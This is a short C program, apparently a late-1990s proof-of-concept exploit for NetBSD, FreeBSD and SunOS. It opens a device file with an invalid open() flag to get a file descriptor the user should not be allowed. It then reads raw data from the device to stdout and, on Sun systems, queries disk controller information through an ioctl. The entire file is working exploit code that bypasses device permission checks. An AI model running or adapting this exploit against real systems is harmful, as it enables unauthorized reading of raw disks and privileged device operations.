/*
 * This will give you a file descriptor on a device you should not have
 * access to.  This seems really, really screwed up, since holding a fd
 * lets you do a lot of ioctls that you should not be able to do...
 *
 * idea from:
 * Message-ID: <19971017104213.11040.qmail@kechara.flame.org>
 * From: explorer@flame.org
 */
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#ifdef NETBSD
# include <err.h>
#else
# include <errno.h>
#endif
#ifdef sun
# include <sun/dkio.h>
#endif

#if defined(NETBSD) || defined(FREEBSD)
# define BAD_FLAG	(-1)		/* this "works" on SunOS too */
#else
# ifdef sun
#  define BAD_FLAG	3		/* according to Theo de Raadt? */
# endif
#endif

int
main(argc, argv)
	int argc;
	char *argv[];
{
	int fd;
	char buf[BUFSIZ];

	if (argc != 2) {
		fprintf(stderr, "usage: %s device\n", argv[0]);
		exit(2);
	}
	if ((fd = open(argv[1], BAD_FLAG, 0)) < 0) {
#ifdef NETBSD
		err(1, "open");
#else
		perror("open()");
#endif
		exit(1);
	}
	printf("got fd = %d.\n", fd);

	if (read(fd, buf, sizeof(buf)) != sizeof(buf)) {
#ifdef NETBSD
		err(1, "read");
#else
		perror("read()");
#endif
	} else {
		if (write(1, buf, sizeof(buf)) != sizeof(buf)) {
#ifdef NETBSD
			err(1, "write");
#else
			perror("write()");
#endif
		}
	}

#ifdef sun
	tdkio(fd);
#endif

	exit(0);
}

#ifdef sun
int
tdkio(fd)
	int fd;
{
	struct dk_info	dki;

	if (ioctl(fd, DKIOCINFO, &dki) < 0) {
		perror("ioctl(DKIOCINFO)");
		return -1;
	}

	fprintf(stderr, "dki_ctlr = %d\n", dki.dki_ctlr);
	fprintf(stderr, "dki_unit = %d\n", dki.dki_unit);
	fprintf(stderr, "dki_ctype = %d\n", dki.dki_ctype);
	fprintf(stderr, "dki_flags = %0x\n", dki.dki_flags);

	return 0;
}
#endif
